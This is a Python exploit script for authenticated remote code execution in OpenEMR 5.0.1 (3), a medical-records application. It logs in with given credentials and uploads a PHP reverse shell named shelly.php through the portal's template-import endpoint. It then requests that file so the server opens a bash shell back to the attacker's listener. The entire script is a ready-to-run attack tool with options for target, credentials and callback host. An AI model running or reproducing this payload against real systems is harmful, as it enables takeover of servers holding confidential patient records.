# OpenEMR 5.0.1 (3) Authenticated RCE 
# Exploit Author: (m4ud)


import requests
import sys
import time


from optparse import OptionParser


print('(m4ud) OpenEMR 5.0.1 (3) Authenticated RCE\r\n')

class ProFTPDExploit:
	def __init__(self, options): 
		self.lhost = options.lhost
		self.target = options.target
		self.username = options.username
		self.password = options.password
		self.lport = options.lport

		sess = requests.Session()
		url = "http://" + self.target + "/interface/main/main_screen.php?auth=login&site=default"
		data= {'new_login_session_management' : '1','authProvider' : 'Default','authUser' : self.username,'clearPass' : self.password,'languageChoice' : '1'}
		print("[ + ] Checking auth !?! [ + ]")
		response = sess.post(url, data=data, allow_redirects=False)
		payload = {'site': 'default', 'mode' : 'save', 'docid' : 'shelly.php', 'content' : """<?php $sock=fsockopen(""" + '"' + self.lhost +'"' +","+ self.lport + """);$proc=proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>"""}
		print('[ * ] Getting Shell, check your NetCat listener!!! [ * ]')
		r = sess.post("http://" + self.target +"/portal/import_template.php?site=default", data = payload)
		time.sleep(1)
		shell = sess.get("http://"+ self.target +"/portal/shelly.php")


def main():
	parser = OptionParser()
	parser.add_option("-l", "--lhost", dest="lhost", help="Local IP Required for Reverse Shell, ")
	parser.add_option("-p", "--lport", dest="lport", help="Port Required for Reverse Shell, ")
	parser.add_option("-t", "--target", dest="target", help="Vulnerable Target, ")
	parser.add_option("-u", "--username", dest="username", help="Usarname, ")
	parser.add_option("-w", "--password", dest="password", help="Password, ")
	(options, args) = parser.parse_args() 
	exploit = ProFTPDExploit(options) 
if __name__=="__main__": 
	main()

